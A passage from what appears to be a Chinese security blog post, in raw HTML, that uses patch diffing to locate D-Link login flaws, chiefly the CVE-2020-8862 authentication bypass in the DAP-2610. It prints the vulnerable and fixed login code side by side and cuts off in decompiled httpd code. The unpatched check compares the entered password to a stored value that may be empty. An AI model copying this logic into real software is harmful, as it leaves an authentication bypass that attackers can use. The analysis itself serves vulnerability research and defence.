!strcasecmp(v4 + v8 + <span class="number">8</span>, <span class="string">&quot;QueryTime&quot;</span>) )</span><br><span class="line">              *(a2 + <span class="number">140</span>) = atol(v4 + <span class="number">150</span> * i + <span class="number">58</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(a2 + <span class="number">136</span>) = atol(v4 + <span class="number">150</span> * i + <span class="number">58</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = v4 + v8 + <span class="number">58</span>;</span><br><span class="line">        v7 = a2 + <span class="number">100</span>;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">strcpy</span>(v7, v6);</span><br></pre></td></tr></table></figure></div><p>其中 V7 就是上述的 v46[25]，很明显，用户信息中本来就默认保存了 private key 这个值，但是旧版本中要先调用 hmac_md5 计算得到 private key，而且计算过程中带入了攻击者可控的数据，这样会导致验证绕过。</p><p>新版本中取消了动态计算 private_key 的过程，直接从已经保存的用户信息中获取，并且在 check_login_addr 函数中检查了 getLoginInfo 的返回值。</p><h1 id="CVE-2020-8862"><a href="#CVE-2020-8862" class="headerlink" title="CVE-2020-8862"></a>CVE-2020-8862</h1><p>2020年2月21日，ZDI 团队披露了在 Dlink DAP-2610 路由器中存在身份验证绕过漏洞，漏洞成因是在处理登录请求的时候对于 password 处理不恰当。</p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>此设备使用 php 实现 web 端相关逻辑，我们采用补丁对比的策略进行漏洞定位。</p><p>首先根据披露信息可以得知，漏洞出现在处理 password 的逻辑中，那么首先搜索 login 字符串，查找和登录有关的代码，这里我在 web 目录下找到了 login.php 和 __login.php，这两个文件似乎和登录逻辑相关。摘抄相关代码如下</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">/* vi: set sw=4 ts=4: */</span></span><br><span class="line"><span class="comment">//echo &quot;Username[&quot;.$LOGIN_USER.&quot;], Password[&quot;.$LOGIN_PASSWD.&quot;]\n&quot;;</span></span><br><span class="line"><span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;401&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$authnum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$max_authnum</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/authnum&quot;</span>);</span><br><span class="line"><span class="variable">$max_session</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/sessionum&quot;</span>);</span><br><span class="line"><span class="variable">$cfg_radiusclient_enable</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_enable&quot;</span>);</span><br><span class="line"><span class="variable">$index</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$index</span>&lt;=<span class="variable">$max_session</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/user/ac_auth&quot;</span>)==<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$authnum</span>++;&#125;</span><br><span class="line">	<span class="variable">$index</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ac_auth</span>=<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user/ac_auth&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$authnum</span>&gt;=<span class="variable">$max_authnum</span> &amp;&amp; <span class="variable">$ac_auth</span>!=<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$full</span>=<span class="string">&quot;1&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$full</span>==<span class="string">&quot;1&quot;</span> || <span class="variable">$sid</span>==<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;full&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$match</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span>!=<span class="string">&quot;&quot;</span>)<span class="comment">// &amp;&amp; $password!=&quot;&quot;)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// check the user name and password.</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$cfg_radiusclient_enable</span>!=<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="string">&quot;/sys/user&quot;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;&quot;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$ac_auth</span> == <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span> == <span class="variable">$user_d</span> &amp;&amp; <span class="variable">$ac_auth</span> != <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">						<span class="variable">$hmac_md5_path</span> = <span class="string">&quot;/var/proc/web/hmac_md5/&quot;</span>.<span class="variable">$session_uid</span>;</span><br><span class="line">						<span class="variable">$password_noenc</span> = <span class="title function_ invoke__">query</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">						<span class="variable">$acc_per</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;acc_per&quot;</span>);</span><br><span class="line">						<span class="variable">$password_d</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$LOGIN_PASSWD</span> == <span class="variable">$password_d</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">							<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">							<span class="variable">$private_key</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="variable">$password_md5</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/id&quot;</span>,<span class="variable">$sid</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$LOGIN_USER</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/pass&quot;</span>,     <span class="variable">$password_noenc</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/acc_per&quot;</span>,	<span class="variable">$acc_per</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/private_key&quot;</span>,	<span class="variable">$private_key</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/password_md5&quot;</span>,	<span class="variable">$password_md5</span>);</span><br><span class="line">							<span class="comment">//login access delete hamc</span></span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/challenge&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/public_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/time&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/session_uid&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_username&quot;</span>,<span class="variable">$LOGIN_USER</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_password&quot;</span>,<span class="variable">$LOGIN_PASSWD</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/runtime/web/sub_str&quot;</span>,<span class="string">&quot;RADIUSCLIENT&quot;</span>);</span><br><span class="line">			<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/name&quot;</span>);</span><br><span class="line">			<span class="variable">$password_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/password&quot;</span>);</span><br><span class="line">			<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/group&quot;</span>);</span><br><span class="line">			<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$user_d</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">			<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">			<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;radiusclient&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;1&quot;</span>)	&#123;<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>上面是 __login.php 的代码，从注释和逻辑上大致分析一下可以确定这里就是用于验证登录信息的位置，再来看看修复过的代码：</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">/* vi: set sw=4 ts=4: */</span></span><br><span class="line"><span class="comment">//echo &quot;Username[&quot;.$LOGIN_USER.&quot;], Password[&quot;.$LOGIN_PASSWD.&quot;]\n&quot;;</span></span><br><span class="line"><span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;401&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$authnum</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$max_authnum</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/authnum&quot;</span>);</span><br><span class="line"><span class="variable">$max_session</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/proc/web/sessionum&quot;</span>);</span><br><span class="line"><span class="variable">$cfg_radiusclient_enable</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_enable&quot;</span>);</span><br><span class="line"><span class="variable">$index</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$index</span>&lt;=<span class="variable">$max_session</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$index</span>.<span class="string">&quot;/user/ac_auth&quot;</span>)==<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$authnum</span>++;&#125;</span><br><span class="line">	<span class="variable">$index</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ac_auth</span>=<span class="title function_ invoke__">fread</span>(<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user/ac_auth&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$authnum</span>&gt;=<span class="variable">$max_authnum</span> &amp;&amp; <span class="variable">$ac_auth</span>!=<span class="string">&quot;1&quot;</span>)&#123;<span class="variable">$full</span>=<span class="string">&quot;1&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$full</span>==<span class="string">&quot;1&quot;</span> || <span class="variable">$sid</span>==<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;full&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$match</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span>!=<span class="string">&quot;&quot;</span>)<span class="comment">// &amp;&amp; $password!=&quot;&quot;)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// check the user name and password.</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$cfg_radiusclient_enable</span>!=<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="string">&quot;/sys/user&quot;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;&quot;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$ac_auth</span> == <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$LOGIN_USER</span> == <span class="variable">$user_d</span> &amp;&amp; <span class="variable">$ac_auth</span> != <span class="string">&quot;1&quot;</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">						<span class="variable">$hmac_md5_path</span> = <span class="string">&quot;/var/proc/web/hmac_md5/&quot;</span>.<span class="variable">$session_uid</span>;</span><br><span class="line">						<span class="variable">$password_noenc</span> = <span class="title function_ invoke__">query</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">						<span class="variable">$acc_per</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;acc_per&quot;</span>);</span><br><span class="line">						<span class="variable">$password_d</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password_d</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$LOGIN_PASSWD</span> == <span class="variable">$password_d</span>)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">							<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">							<span class="variable">$private_key</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="variable">$password_md5</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/id&quot;</span>,<span class="variable">$sid</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$LOGIN_USER</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/pass&quot;</span>,     <span class="variable">$password_noenc</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/acc_per&quot;</span>,	<span class="variable">$acc_per</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/private_key&quot;</span>,	<span class="variable">$private_key</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/password_md5&quot;</span>,	<span class="variable">$password_md5</span>);</span><br><span class="line">							<span class="comment">//login access delete hamc</span></span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/challenge&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/public_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/time&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/session_uid&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_username&quot;</span>,<span class="variable">$LOGIN_USER</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_password&quot;</span>,<span class="variable">$LOGIN_PASSWD</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/runtime/web/sub_str&quot;</span>,<span class="string">&quot;RADIUSCLIENT&quot;</span>);</span><br><span class="line">			<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/name&quot;</span>);</span><br><span class="line">			<span class="variable">$password_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/password&quot;</span>);</span><br><span class="line">			<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/group&quot;</span>);</span><br><span class="line">			<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$user_d</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">			<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">			<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;radiusclient&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;1&quot;</span>)	&#123;<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>实际上存在差别的代码只有一句：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">旧版本：</span><br><span class="line">if($LOGIN_PASSWD == $password_d)</span><br><span class="line"></span><br><span class="line">新版本：</span><br><span class="line">if($password_d != &quot;&quot; &amp;&amp; $LOGIN_PASSWD == $password_d)</span><br></pre></td></tr></table></figure></div><p>新版本中验证了变量 $password_d 是否为空，然后才与 $LOGIN_PASSWD 进行比较。</p><p>那么这些变量是从哪里来的呢？通过查看 login.php 代码可以确定 $LOGIN_PASSWD 变量是用户输入的密码，而 $password_d 从上面的代码来看是从文件 &#x2F;var&#x2F;proc&#x2F;web&#x2F;hmac_md5&#x2F;$session_uid&#x2F;password_md5 读取的。</p><p>通过搜索 password_md5 ，发现 httpd 文件中包含此字符串，关键函数是 FUN_00012bb8，代码如下：</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 